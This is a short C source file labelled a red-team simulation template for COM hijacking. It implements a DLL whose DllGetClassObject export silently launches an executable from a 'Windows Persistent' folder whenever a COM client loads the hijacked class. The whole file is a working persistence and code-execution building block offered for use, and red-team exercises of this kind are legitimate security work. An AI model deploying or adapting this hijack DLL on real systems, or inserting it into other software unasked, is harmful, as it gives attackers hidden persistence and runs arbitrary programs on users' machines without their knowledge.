/*

 Red Team Simulation template
 COM hijacking template
 
 Author: Shaikh Jamal Uddin (Linkedin: https://www.linkedin.com/in/engrjamal/ )

*/
#include <Windows.h>
#include <combaseapi.h>


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;    
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

HRESULT STDAPI DllGetClassObject(__in REFCLSID rclsid,
								__in REFIID riid,
								__deref_out LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	
	CreateProcess(
				"c:\\Windows Persistent\\Embed\\embed.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	return S_OK;  
} 

